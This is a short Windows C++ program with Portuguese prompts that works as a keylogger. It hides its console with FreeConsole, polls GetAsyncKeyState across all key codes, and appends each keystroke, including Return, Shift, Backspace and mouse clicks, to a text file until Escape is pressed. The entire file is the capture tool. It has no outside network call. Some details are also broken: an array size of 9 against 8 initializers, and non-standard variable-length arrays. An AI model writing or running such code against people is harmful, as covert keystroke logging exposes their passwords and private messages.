#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;

int main() {
    string s;
    cout << "Diga o nome do arquivo: ";
    getline(cin, s);
    s += ".txt";
    cout << "Irei iniciar em 3 segundos..." << endl;
    for (int i = 3; i >= 1; i--) {
        cout << i << " ";
        Sleep(1000);
    }
    cout << endl;
    FreeConsole();
    int n = 9;
    ofstream arq;
    bool exit = false;
    while (true) {
        if (exit) {
            break;
        }
        Sleep(10);
        for (int i = 0; i <= 255; i++) {

            if (GetAsyncKeyState(i) == -32767) {
                int keys[n] = {VK_RETURN, VK_LBUTTON, VK_SHIFT, VK_CONTROL, VK_BACK, VK_ESCAPE, VK_RBUTTON, VK_DELETE};
                string kn[n] = {"Return", "left mouse", "shift", "control", "beque", "esc", "right mouse", "del"};
                bool yay = true;
                for (int ii = 0; ii < n; ii++) {
                    if (keys[ii] == i) {
                        arq.open(s.c_str(), ios::app);
                        arq << kn[ii] << endl;
                        arq.close();
                        if (ii == 5) {
                            exit = true;
                        }
                        //cout << kn[ii] << endl;
                        yay = false;
                    }
                }
                if (yay) {
                    arq.open(s.c_str(), ios::app);
                    arq << (char)(i) << endl;
                    arq.close();
                }
            }
        }
    }
    return 0;
}
